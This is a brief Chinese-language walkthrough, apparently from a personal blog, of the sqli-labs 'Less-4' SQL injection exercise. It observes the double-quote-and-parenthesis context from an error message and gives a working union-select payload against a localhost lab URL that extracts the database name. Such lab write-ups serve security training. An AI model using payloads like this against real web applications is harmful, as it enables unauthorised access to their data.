less4根据提示 double quotes 使用双引号”

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/ctf/sql注入深度剖析/sqli_labs通关/basic_challenges（基础挑战）/images/2E951C2C9DE74E749FAA6593E98DF482clipboard.png)

根据报错提示还有括号（）



构造payload:

http://127.0.0.1/sql-labs/Less-4/?id=-1") union select 1,database(),3--+

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/ctf/sql注入深度剖析/sqli_labs通关/basic_challenges（基础挑战）/images/805F7AFB34C541898AD0A1950D2408E2clipboard.png)

